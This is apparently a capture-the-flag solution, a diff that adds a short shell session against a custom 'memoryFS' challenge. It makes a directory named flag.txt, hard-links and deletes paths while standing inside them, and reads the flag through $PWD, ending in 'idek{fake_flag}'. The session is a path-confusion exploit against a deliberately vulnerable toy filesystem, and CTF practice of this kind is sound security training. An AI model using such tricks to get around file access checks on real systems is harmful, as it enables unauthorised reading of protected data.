@@ -1,0 +1,9 @@
+user@memoryFS:/$ mkdir flag.txt
+user@memoryFS:/$ ln flag.txt a
+user@memoryFS:/$ cd a
+user@memoryFS:/a$ rm /a 
+user@memoryFS:/a$ cd .
+user@memoryFS:/flag.txt$ rm /flag.txt
+user@memoryFS:/flag.txt$ create_flag
+user@memoryFS:/flag.txt$ cat $PWD
+idek{fake_flag}
